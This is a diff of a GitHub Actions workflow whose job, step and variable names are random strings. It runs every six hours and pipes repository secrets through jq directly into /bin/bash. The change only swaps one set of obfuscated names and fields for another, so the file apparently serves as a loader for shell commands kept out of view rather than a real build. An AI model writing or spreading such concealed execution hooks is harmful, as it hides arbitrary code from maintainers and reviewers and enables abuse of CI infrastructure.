@@ -1,31 +1,22 @@
 name: mahuanghou7654
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 3/6 * * *'
-jobs:  # 27873
+    - cron: '6 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mahuanghou7654
         env:
-          zgq3494: ${{ secrets.zgq3494 }}
+          lctbt0827: ${{ secrets.lctbt0827 }}
         run: |
-          echo $zgq3494 | jq -r .luzmz94042 | /bin/bash
-          echo $tnh6 | jq -r .mrkpe4148 | /bin/bash
-          echo $iz444 | jq -r .kxt9 | /bin/bash
-          echo $qjvqe9884 | jq -r .y4 | /bin/bash
-          echo $mul3804 | jq -r .pxeg9 | /bin/bash
-          echo $pod72516 | jq -r .ehyih853 | /bin/bash
-          echo $baj8402 | jq -r .afq831 | /bin/bash
-          echo $kvwfw3 | jq -r .sl07 | /bin/bash
-          echo $bvsr682 | jq -r .ydp21 | /bin/bash
-          echo $s241 | jq -r .a15 | /bin/bash
-          echo $aye43409 | jq -r .l877 | /bin/bash
-          echo $rnr14676 | jq -r .rgh54344 | /bin/bash
-          echo $lptr3860 | jq -r .dvdv8 | /bin/bash
-          echo $saxs77585 | jq -r .oowg91827 | /bin/bash
+          echo $lctbt0827 | jq -r .bqvco573 | /bin/bash
+          echo $mtbw0 | jq -r .hnlp8866 | /bin/bash
+          echo $eu4027 | jq -r .iqos9358 | /bin/bash
+          echo $fklok2 | jq -r .gpib04846 | /bin/bash
+          echo $y69 | jq -r .md656 | /bin/bash
+          echo $o503 | jq -r .u06 | /bin/bash
+          echo $a18136 | jq -r .roacf79264 | /bin/bash
 
